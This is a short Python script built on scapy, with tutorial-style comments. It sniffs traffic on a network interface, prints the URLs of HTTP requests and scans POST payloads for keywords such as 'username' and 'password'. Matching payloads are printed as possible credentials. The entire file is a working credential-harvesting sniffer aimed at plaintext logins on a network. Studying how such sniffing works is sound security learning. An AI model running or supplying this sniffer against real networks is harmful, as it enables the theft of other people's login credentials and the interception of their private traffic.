import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)#prn is the function that will be called everytime on the packet.
    

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest): #has layer is the method through which it checks if the packet has the specifed layer or not in this case it is checking for http.
        # print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # Extracting urls in the sniffer.
        print("Http request => " + str(url))
        
        if packet.haslayer(scapy.Raw):#Now it is checking the raw layer because in that layer post request is found which has username and password in it.
            # print(packet.show()
            load = str(packet[scapy.Raw].load) # This variabe will only show the packet in that raw layer with the load parameter where username and pass is loaded.
# All of these things can be shown with the help of packet.show() if you wanna analyse each layer. Now we can directly show these packets but sometimes different websites uses different parameters so in this case we are gonna check the specific keywords like "username" and "password". We can do this by regex of beautiful soup.
            keywords = ["username", "user", "login", "password", "pass", "uname"]
            for keyword in keywords:
                if keyword in load:
                    print("Possible Username and Passwords = > " + load + "\n\n")
                    break



sniff("en0")
